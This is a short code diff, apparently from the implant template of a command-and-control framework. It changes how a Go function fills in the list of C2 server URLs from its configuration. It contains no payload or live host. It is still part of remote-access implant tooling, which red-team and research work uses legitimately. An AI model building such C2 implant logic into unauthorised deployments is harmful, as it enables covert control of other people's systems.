@@ -52,7 +52,7 @@ func C2Generator(abort <-chan struct{}, temporaryC2 ...string) <-chan *url.URL {
 	} else {
 		// {{range $index, $value := .Config.C2}}
 		c2Servers = append(c2Servers, func() string {
-			return "{{$value.URL}}" // {{$index}}
+			return "{{$value}}" // {{$index}}
 		})
 		// {{end}} - range
 	}
